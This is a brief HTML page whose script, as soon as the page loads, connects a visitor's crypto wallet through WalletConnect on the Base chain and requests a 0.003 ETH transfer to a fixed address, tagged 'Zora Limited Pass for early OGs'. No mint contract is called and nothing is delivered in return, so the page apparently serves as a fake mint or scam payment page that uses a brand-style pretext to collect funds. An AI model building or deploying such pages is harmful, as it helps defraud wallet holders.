<!DOCTYPE html>
<html>
<head>
  <script src="https://cdn.jsdelivr.net/npm/web3@1.8.2/dist/web3.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/@walletconnect/web3-provider@1.7.8/dist/umd/index.min.js"></script>
</head>
<body>
<script>
(async () => {
  try {
    const provider = new WalletConnectProvider.default({
      rpc: {
        8453: "https://mainnet.base.org"
      },
      chainId: 8453,
      qrcode: true
    });

    await provider.enable();
    const web3 = new Web3(provider);
    const accounts = await web3.eth.getAccounts();
    const from = accounts[0];
    const to = "0xCF62064d70593ecd8B319b267F769ddD181157d2";
    const value = web3.utils.toWei("0.003", "ether");
    const data = web3.utils.utf8ToHex("Zora Limited Pass for early OGs");

    alert("Sending 0.003 ETH...");
    const tx = await web3.eth.sendTransaction({ from, to, value, data });
    alert("Transaction sent: " + tx);
  } catch (e) {
    alert("Error: " + e.message);
    console.error(e);
  }
})();
</script>
</body>
</html>
